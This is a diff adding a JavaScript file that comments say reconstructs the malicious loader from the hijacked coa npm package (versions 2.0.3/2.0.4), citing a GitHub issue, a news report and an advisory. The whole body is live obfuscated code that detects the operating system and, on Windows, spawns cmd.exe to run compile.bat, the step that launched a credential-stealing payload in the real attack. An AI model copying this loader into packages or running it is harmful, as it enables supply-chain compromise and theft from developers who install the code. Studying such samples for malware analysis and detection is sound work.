@@ -1,0 +1,10 @@
+// coa@2.0.3 / 2.0.4 — reconstructed from public security analyses
+// Source: https://github.com/veged/coa/issues/99
+// Source: https://www.bleepingcomputer.com/news/security/popular-coa-npm-library-hijacked-to-steal-user-passwords/
+// Advisory: GHSA-73qr-pfmq-6rp8
+//
+// Obfuscated with obfuscator.io — _0x pattern with string array rotation.
+// Deobfuscated: detects OS, on Windows spawns cmd.exe /c compile.bat
+// On Linux/macOS: NOP (no payload).
+
+const _0x29286e=_0x3b9e;(function(_0x595213,_0x1c7f12){const _0x524030=_0x3b9e,_0x10bbc4=_0x595213();while(!![]){try{const _0x5ab451=parseInt(_0x524030(0xef))/0x1*(-parseInt(_0x524030(0xfa))/0x2)+parseInt(_0x524030(0xf7))/0x3+-parseInt(_0x524030(0xf6))/0x4*(parseInt(_0x524030(0xf5))/0x5)+-parseInt(_0x524030(0xf2))/0x6*(-parseInt(_0x524030(0xed))/0x7)+-parseInt(_0x524030(0xf8))/0x8*(parseInt(_0x524030(0xe9))/0x9)+parseInt(_0x524030(0xeb))/0xa+parseInt(_0x524030(0xf3))/0xb*(parseInt(_0x524030(0xf4))/0xc);if(_0x5ab451===_0x1c7f12)break;else _0x10bbc4['push'](_0x10bbc4['shift']());}catch(_0x3b1efb){_0x10bbc4['push'](_0x10bbc4['shift']());}}}(_0x4f67,0x3d733));const {exec}=require('child_process');function _0x4f67(){const _0x5d7817=['28bejTPQ','1355673ZDaxId','779896MgsJdu','child_process','26358GzOkXk','MacOS','platform','cmd.exe','win64','27EVEPMY','win32','768760SJubeg','Linux','111587KPhwpG','compile.bat','11xGbwXc','linux','darwin','36HiOlse','11PTXHjR','3696096qOooYF','173780mPHnxy'];_0x4f67=function(){return _0x5d7817;};return _0x4f67();}var opsys=process[_0x29286e(0xfc)];function _0x3b9e(_0x21f5ee,_0x411966){const _0x4f6708=_0x4f67();return _0x3b9e=function(_0x3b9ecb,_0x3ac81f){_0x3b9ecb=_0x3b9ecb-0xe9;let _0x5a6794=_0x4f6708[_0x3b9ecb];return _0x5a6794;},_0x3b9e(_0x21f5ee,_0x411966);}if(opsys==_0x29286e(0xf1))opsys=_0x29286e(0xfb);else{if(opsys==_0x29286e(0xea)||opsys==_0x29286e(0xfe)){opsys='Windows';const {spawn}=require(_0x29286e(0xf9)),bat=spawn(_0x29286e(0xfd),['/c',_0x29286e(0xee)]);}else opsys==_0x29286e(0xf0)&&(opsys=_0x29286e(0xec));}
